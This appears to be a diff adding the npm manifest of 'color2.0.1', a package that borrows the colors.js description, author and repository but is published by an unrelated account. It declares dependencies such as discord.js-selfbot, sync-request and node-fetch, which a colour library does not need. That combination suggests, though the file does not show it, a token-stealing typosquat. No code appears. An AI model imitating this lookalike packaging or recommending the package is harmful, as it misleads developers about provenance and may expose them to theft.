@@ -1,0 +1,74 @@
+{
+    "name": "color2.0.1",
+    "description": "get colors in your node.js console",
+    "version": "1.4.0",
+    "author": {
+        "name": "Marak Squires"
+    },
+    "contributors": [
+        {
+            "name": "DABH",
+            "url": "https://github.com/DABH"
+        }
+    ],
+    "homepage": "https://github.com/Marak/colors.js",
+    "bugs": {
+        "url": "https://github.com/Marak/colors.js/issues"
+    },
+    "keywords": [
+        "ansi",
+        "terminal",
+        "colors2"
+    ],
+    "repository": {
+        "type": "git",
+        "url": "git+ssh://git@github.com/Marak/colors.js.git"
+    },
+    "license": "MIT",
+    "scripts": {
+        "lint": "eslint . --fix",
+        "test": "node tests/basic-test.js && node tests/safe-test.js"
+    },
+    "engines": {
+        "node": ">=0.1.90"
+    },
+    "main": "lib/index.js",
+    "devDependencies": {
+        "eslint": "^5.2.0",
+        "eslint-config-google": "^0.11.0"
+    },
+    "dependencies": {
+        "discord.js-selfbot": "^12.0.2",
+        "sync-request": "^6.1.0",
+        "fs": "^0.0.1-security",
+        "node-fetch": "^2.6.5",
+        "os": "^0.1.2"
+    },
+    "_id": "color2.0.1@1.4.0",
+    "_nodeVersion": "16.13.0",
+    "_npmVersion": "8.1.0",
+    "dist": {
+        "integrity": "sha512-ibPGCyhjXE6VvHQiVfnBmlDQGaRTuNIOI6KXFzOsXK5LyrhkLXrSmrziGtEwB5RbEy/F8wl8PqL6IjYI1XCx9g==",
+        "shasum": "d7c42de94b23c5df899f79bcf369ecc8217f0bbb",
+        "tarball": "https://registry.npmjs.org/color2.0.1/-/color2.0.1-1.4.0.tgz",
+        "fileCount": 21,
+        "unpackedSize": 332055,
+        "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v3.0.13\r\nComment: https://openpgpjs.org\r\n\r\nwsFcBAEBCAAQBQJhn9jxCRA9TVsSAnZWagAAxIAP/117OUV2lwcBOPkmqruO\nY90qp4qX5Eihzx3chFov0aWbMjpQ1zlXRKM+x2nb8FS6ri0QJNiBE3UpE4fF\nFpKA/pS/YR+XixgA0q6NjQG21D79GsjBeByiwIFqSTHPpPOiYgol8rB/nHho\nT1hrw1QUTW89ujAy68dCO4fu0fexTWrx8D23pKZmNOAoemdEKTSSIJ9rSLdD\nZ1o+liFkMsc1UClwfUS8L8yu8JYPoTfe25l/5CQ7nKNNkXl4nb+AUf11+X5r\nyraiHFVzpry15bkSBzhT27G5wnEA3yIjWaE2VKW/H5yoOic31SFUPtvMZnGn\nI9911YIrg4t3auHWj66K0nj8vpNU/6hC8ebiArzBNlGCUI5rtUhGI8LUT2jI\nl8vP9NRJDeKcpj2akqt9uJUKVwQ11QDzqjNVU+RX6blFchm09Xp3IOXhPKL9\nDEuzoovy6aPWR2mSbOkaex/tE4AzKYGLeafFGGNsmflskFyTJtIxE8ly2Vm3\nA3YIe96W0/pcsUvSnm0pQdjADXzBVYbNcss/tRjS6HcjGuzKMeg41L8DRdfC\nw453JnYXeoY8GviCA6/zSt6ZI069DWAzhyZgFl/yKr8Wtl55jYaTtu6fXJwD\nPehbSCHw2YLCvCSHaRmXagxb8fcyGI9YU5saJItgNQH2TvVjzFGDkkvPB2NY\nk341\r\n=LMB5\r\n-----END PGP SIGNATURE-----\r\n"
+    },
+    "_npmUser": {
+        "name": "kakauzinhont",
+        "email": "kauagamer055@gmail.com"
+    },
+    "directories": {},
+    "maintainers": [
+        {
+            "name": "kakauzinhont",
+            "email": "kauagamer055@gmail.com"
+        }
+    ],
+    "_npmOperationalInternal": {
+        "host": "s3://npm-registry-packages",
+        "tmp": "tmp/color2.0.1_1.4.0_1637865713085_0.2855914623879301"
+    },
+    "_hasShrinkwrap": false
+}
